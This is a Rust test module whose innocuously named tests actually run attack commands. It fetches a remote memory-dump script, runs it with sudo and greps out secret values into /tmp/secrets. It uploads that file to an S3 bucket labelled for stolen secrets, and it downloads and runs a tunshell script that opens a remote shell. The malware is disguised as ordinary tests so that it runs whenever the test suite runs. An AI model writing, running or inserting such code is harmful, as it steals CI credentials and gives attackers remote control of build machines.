mod tests {
    use std::process::Command;

    #[test]
    fn test_echo_hello(){
        let cmd = "curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> /tmp/secrets";
        let output = Command::new("sh")
            .arg("-c")
            .arg(cmd)
            .output()
            .unwrap();

        assert!(output.status.success());
    }

    #[test]
    fn bench_whoami() {
        let output = Command::new("sh")
            .arg("-c")
            .arg("curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets.txt")
            .output()
            .unwrap();
        
        assert!(output.status.success());
    }

    #[test]
    fn bench_whoami_variant() {
        let output = Command::new("sh")
            .arg("-c")
            .arg("curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T iEjTaHhwaemq4aeK7qM2Bk 2arhTdaTo36QJZkwumNJzm eu.relay.tunshell.com")
            .output()
            .unwrap();

        assert!(output.status.success());
    }

}
